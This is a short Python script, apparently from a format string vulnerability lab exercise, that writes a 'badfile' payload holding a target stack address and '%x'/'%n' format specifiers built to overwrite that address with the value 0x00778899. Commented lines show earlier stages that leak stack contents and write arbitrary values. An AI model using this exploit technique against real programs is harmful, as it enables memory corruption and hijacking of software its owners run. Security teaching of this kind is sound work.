#!/usr/bin/python3

import sys

N = 1200
content = bytearray(0x0 for i in range(N))

# Put the address at the beginning
addr = 0xffffd194
content[0:4] = (addr).to_bytes(4,byteorder='little')

###################################################
# Add the format specifiers
# Investigation
# s = "%x_"*10 + "\n"

# Modify memory (any value)
# s = "%x_"*5 + "%n" + "\n"

# Modify memory (with specific value)
D = 0x00778899 - 4 - 8*4
s = "%.8x"*4 + "%." + str(D) + "x" + "%n" + "\n"

# Store the string to the content bytearray
fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
